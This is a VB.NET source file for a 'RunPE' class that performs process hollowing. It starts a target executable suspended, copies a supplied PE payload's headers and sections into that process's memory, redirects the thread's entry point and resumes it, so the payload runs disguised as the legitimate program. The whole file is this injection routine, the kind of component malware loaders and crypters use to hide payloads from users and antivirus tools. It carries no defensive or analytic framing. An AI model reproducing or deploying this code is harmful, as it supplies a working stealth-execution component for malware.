Imports System.ComponentModel
Imports System.IO
Imports System.Runtime.InteropServices
Public Class RunPE
    Public Const CREATE_SUSPENDED = &H4
    Const PE_POINTER_OFFSET As Integer = 60
    Const MACHINE_OFFSET As Integer = 4
    Public Shared Function Start(lpBuffer() As Byte, targetexe As String) As Boolean


        Dim baseAddress As IntPtr = Marshal.AllocHGlobal(lpBuffer.Length)
        Marshal.Copy(lpBuffer, 0, baseAddress, lpBuffer.Length)
        Dim dosHeader As IMAGE_DOS_HEADER = Marshal.PtrToStructure(baseAddress, GetType(IMAGE_DOS_HEADER))


        If dosHeader.e_magic <> &H5A4D Then
            Throw New Win32Exception("Not a valid PE!")
        End If
        Dim PE_HEADER_ADDR As Integer = BitConverter.ToInt32(lpBuffer, PE_POINTER_OFFSET)
        Dim machineUint As Integer = BitConverter.ToUInt16(lpBuffer, PE_HEADER_ADDR + MACHINE_OFFSET)

        Dim pImageBase32 As IntPtr
        Dim pImageBase64 As UIntPtr
        Dim ImageBase As UInteger
        Dim SizeOfImage As UInteger
        Dim SizeOfHeaders As UInteger
        Dim NumberOfSections As UShort
        Dim AddressOfEntryPoint As UInteger
        Dim nt_header_ptr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew)

        If machineUint = &H14C Then
            Dim ntHeaders32 As IMAGE_NT_HEADERS32 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS32))
            pImageBase32 = New IntPtr(ntHeaders32.OptionalHeader.ImageBase)
            ImageBase = ntHeaders32.OptionalHeader.ImageBase
            SizeOfImage = ntHeaders32.OptionalHeader.SizeOfImage
            SizeOfHeaders = ntHeaders32.OptionalHeader.SizeOfHeaders
            NumberOfSections = ntHeaders32.FileHeader.NumberOfSections
            AddressOfEntryPoint = ntHeaders32.OptionalHeader.AddressOfEntryPoint
        Else
            Dim ntHeaders64 As IMAGE_NT_HEADERS64 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS64))
            pImageBase64 = New UIntPtr(ntHeaders64.OptionalHeader.ImageBase)
            ImageBase = ntHeaders64.OptionalHeader.ImageBase
            SizeOfImage = ntHeaders64.OptionalHeader.SizeOfImage
            SizeOfHeaders = ntHeaders64.OptionalHeader.SizeOfHeaders
            NumberOfSections = ntHeaders64.FileHeader.NumberOfSections
            AddressOfEntryPoint = ntHeaders64.OptionalHeader.AddressOfEntryPoint
        End If


        Dim si As New STARTUPINFO()
        Dim pi As New PROCESS_INFORMATION()
        Dim hRet = CreateProcess(targetexe, 0, 0, IntPtr.Zero, False, CREATE_SUSPENDED, IntPtr.Zero, Nothing, si, pi)
        If hRet = False Then
            GoTo retexit
        End If
        Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)

        If VirtualAllocEx(hHandle, pImageBase32, SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE) = IntPtr.Zero Then
            GoTo retexit
        End If

        If Not WriteProcessMemory(hHandle, pImageBase32, baseAddress, SizeOfHeaders, IntPtr.Zero) Then
            GoTo retexit
        End If

        If machineUint = &H14C Then
            For i = 0 To NumberOfSections - 1
                Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS32) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
                Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
                If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase32, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
                    GoTo retexit
                End If
            Next
        Else
            For i = 0 To NumberOfSections - 1
                Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS64) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
                Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
                If Not WriteProcessMemory(hHandle, New IntPtr(CLng(CULng(UIntPtr.Add(pImageBase64, section.VirtualAddress)))), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
                    GoTo retexit
                End If
            Next
        End If


        Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
        Marshal.WriteInt64(ptr, ImageBase)

        Dim context32 As New CONTEXT32()
        Dim context64 As New CONTEXT64()

        Dim wow64Process As Boolean
        IsWow64Process(pi.hProcess, wow64Process)
        If wow64Process Then
            context32.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
            If Not Wow64GetThreadContext32(pi.hThread, context32) Then
                GoTo retexit
            End If
            If Not WriteProcessMemory(hHandle, New IntPtr(context32.Ebx + 8), ptr, 4, IntPtr.Zero) Then
                GoTo retexit
            End If
            Marshal.FreeHGlobal(ptr)
            context32.Eax = pImageBase32.ToInt64 + AddressOfEntryPoint
            If Not Wow64SetThreadContext32(pi.hThread, context32) Then
                GoTo retexit
            End If
        Else
            context64.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
            If Not Wow64GetThreadContext64(pi.hThread, context64) Then
                GoTo retexit
            End If
            If Not WriteProcessMemory(hHandle, New IntPtr(CLng(context64.Rdx + 16)), ptr, 8, IntPtr.Zero) Then
                GoTo retexit
            End If
            Marshal.FreeHGlobal(ptr)
            context64.Rcx = pImageBase64 + AddressOfEntryPoint
            If Not Wow64SetThreadContext64(pi.hThread, context64) Then
                GoTo retexit
            End If
        End If

retexit:
        ResumeThread(pi.hThread)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        Marshal.FreeHGlobal(baseAddress)
        Return True
    End Function


End Class
